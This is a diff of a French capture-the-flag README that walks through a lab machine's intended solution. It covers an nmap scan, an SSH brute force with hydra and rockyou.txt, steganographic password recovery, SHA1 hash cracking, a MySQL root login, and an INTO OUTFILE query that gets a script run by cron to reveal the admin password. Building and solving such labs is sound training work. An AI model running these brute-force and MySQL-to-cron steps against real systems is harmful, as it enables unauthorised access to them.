@@ -10,22 +10,29 @@ Ce CTF s'axe sur 3 catégories :
 
 
 ## Etape 1
-
-L'utilisateur lorsque qu'il est sur la machine n'aura en premier lieu accès à un /home où il n'y aura de présent que plusieurs images, dont une contiendra un hash.
-
-Via un autre machine l'utilisateur devra faire un 
+L'utilisateur aura accès a l'addresse IP de la machine et pourra ainsi scanner les ports de la machine à l'aide de la commande nmap 
 ```bash
 nmap -sV -sC [ipmachine]
-hydra -L user.txt -P rockyou.txt 10.10.219.212 ssh
 ```
-Il pourra s'apercevoir qu'un service mysql est ouvert celui sera protéger par un mot de passe et face aux tentatives de bruteforce.
 
-De plus toutes les minutes sur sa console apparaitera un message lui indiquant que des scripts ont été bougé ainsi que l'heure de la machine.
+Il pourra s'apercevoir qu'un service mysql est ouvert celui sera protégé par un mot de passe et face aux tentatives de bruteforce.
+
+![](img/nmap.PNG "nmap")
 
 ## Etape 2
 
-L'utilisateur va dans un second temps parcourir les fichiers sur l'espace utilisateur et trouvera des images dans le dossier Documents.
-Ces images auront été modifié par un script python afin d'y dissimuler le mot de passe du port sql, le numéro : 3306.
+L'attaquant pourra essayer de brutforce avec hydra pour trouver une connexion SSH à l'aide de fichiers regroupant des logins et des mots de passe de base.
+
+```bash
+hydra -L user.txt -P rockyou.txt 10.10.219.212 ssh
+```
+![](img/hydra.PNG "hydra")
+
+## Etape 3
+
+Une fois connecté sur le compte user,  l'attaquant aura accès au home de cet utilisateur et sur celui-ci il trouvera une image.
+Cette image aura été modifié par un script python afin d'y dissimuler le mot de passe du port sql, le numéro : 3306.
+De plus toutes les minutes sur sa console apparaitera un message lui indiquant que des scripts ont été bougé, ainsi que l'heure de la machine.
 
 ```py
 
@@ -53,7 +60,8 @@ def get_msg(input_file):
     """
     data = np.packbits(data)
 
-    # On lit le tout et on convertit en acii jusqu'a qu'on tombe sur un caractère non pritable
+    # On lit le tout et on convertit en acii 
+    # jusqu'a qu'on tombe sur un caractère non pritable
     for x in data:
         l = chr(x)
         if not l.isprintable():
@@ -68,11 +76,16 @@ def main(argv):
 if __name__ == "__main__":
     main(sys.argv)
 ```
-## Etape 3
-
-Le mot de passe étant hashé en SHA1, l'attaquant devra le déhashé en utilsant les rainbow table ou alors à l'aide d'un site web.
 
 ## Etape 4
+
+![](img/decrypt.PNG "decrypt")
+
+Sur ce screen, on voit la solution de la stéganographie, ainsi que le message qui va s'afficher toutes les minutes.
+
+Le mot de passe étant hashé en SHA1, l'attaquant devra le déhashé en utilsant les rainbow table ou alors à l'aide d'un site web (https://hashtoolkit.com/).
+
+## Etape 5
 
 L'attaquant devra ensuite faire une demande de connexion SQL sur le port en question.
 
@@ -81,13 +94,25 @@ mysql -h [ip.host] -u root -p[PASSWORD]
 
 ```
 
-## Etape 5
+![](img/sql.PNG "sql")
+
+Une fois connecté, il pourra voir ce que les bases de données sur la machine.
+Sur celle-ci on voit qu'elle contient des scripts.
+
+![](img/script.PNG "script")
+
+## Etape 6
 
 Une fois connecté au port SQL avec les droits root, l'utilisateur sera en possibilité d'executer des requêtes SQL pour placer un dossier dans la data directory de mysql, qui sera ensuite deplacé dans un fichier où il sera executé par cron.
 
 ```bash
 use scripts
-SELECT text_script FROM script WHERE nom_script='remind_admin_psswq.sh' INTO OUTFILE 'pass.sh';
+
+SELECT text_script FROM script WHERE nom_script='remind_admin_psswq.sh' 
+INTO OUTFILE 'pass.sh';
 ```
 
-Dans son terminal, s'affichera ainsi l'heure ainsi que le mot de passe admin, il pourra ainsi acceder au compte admin.
+![](img/password.PNG "password")
+
+Dans son terminal, s'affichera ainsi l'heure ainsi que le mot de passe admin, il pourra ainsi accéder au compte admin. Il verra aussi qu'il existe un flag dans le home admin.
+
